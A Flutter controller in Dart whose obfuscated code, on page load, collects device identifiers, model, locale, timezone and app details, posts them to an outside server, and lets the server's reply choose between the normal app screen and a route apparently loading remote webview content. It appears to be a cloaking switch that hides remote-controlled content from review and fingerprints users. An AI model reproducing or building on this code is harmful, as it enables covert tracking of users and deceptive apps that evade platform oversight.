import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var rmfwvachit = RxBool(false);
  var zxfrkcsh = RxBool(true);
  var sznmij = RxString("");
  var liana = RxBool(false);
  var walker = RxBool(true);
  final fvaqpxu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    sgfkr();
  }


  Future<void> sgfkr() async {

    liana.value = true;
    walker.value = true;
    zxfrkcsh.value = false;

    fvaqpxu.post("https://hsn-a.gulou.life/eanlrhxbmywqd",data: await pyrhgtwcoq()).then((value) {
      var apvm = value.data["apvm"] as String;
      var djltswfe = value.data["djltswfe"] as bool;
      if (djltswfe) {
        sznmij.value = apvm;
        ulices();
      } else {
        schmitt();
      }
    }).catchError((e) {
      zxfrkcsh.value = true;
      walker.value = true;
      liana.value = false;
    });
  }

  Future<Map<String, dynamic>> pyrhgtwcoq() async {
    final DeviceInfoPlugin wfqvnp = DeviceInfoPlugin();
    PackageInfo bxrizy_sjpo = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var czvndur = Platform.localeName;
    var easmph = currentTimeZone;

    var doqynhrk = bxrizy_sjpo.packageName;
    var umvw = bxrizy_sjpo.version;
    var pwetaz = bxrizy_sjpo.buildNumber;

    var ityloeu = bxrizy_sjpo.appName;
    var qhrxywgp = "";
    var armandEmard = "";
    var vklh = "";
    var tiaraTerry = "";
    var bduwr  = "";
    var rainaBoehm = "";
    var kareemWatsica = "";
    var mayeWeissnat = "";


    var scktweb = "";
    var cgdtwl = false;

    if (GetPlatform.isAndroid) {
      scktweb = "android";
      var ezfysucpd = await wfqvnp.androidInfo;

      qhrxywgp = ezfysucpd.brand;

      vklh  = ezfysucpd.model;
      bduwr = ezfysucpd.id;

      cgdtwl = ezfysucpd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      scktweb = "ios";
      var sizorqvhak = await wfqvnp.iosInfo;
      qhrxywgp = sizorqvhak.name;
      vklh = sizorqvhak.model;

      bduwr = sizorqvhak.identifierForVendor ?? "";
      cgdtwl  = sizorqvhak.isPhysicalDevice;
    }
    var res = {
      "qhrxywgp": qhrxywgp,
      "ityloeu": ityloeu,
      "pwetaz": pwetaz,
      "doqynhrk": doqynhrk,
      "kareemWatsica" : kareemWatsica,
      "vklh": vklh,
      "umvw": umvw,
      "bduwr": bduwr,
      "rainaBoehm" : rainaBoehm,
      "czvndur": czvndur,
      "easmph": easmph,
      "scktweb": scktweb,
      "cgdtwl": cgdtwl,
      "tiaraTerry" : tiaraTerry,
      "armandEmard" : armandEmard,
      "mayeWeissnat" : mayeWeissnat,

    };
    return res;
  }

  Future<void> schmitt() async {
    Get.offAllNamed("/hall_tab");
  }

  Future<void> ulices() async {
    Get.offAllNamed("/hall_use");
  }
}
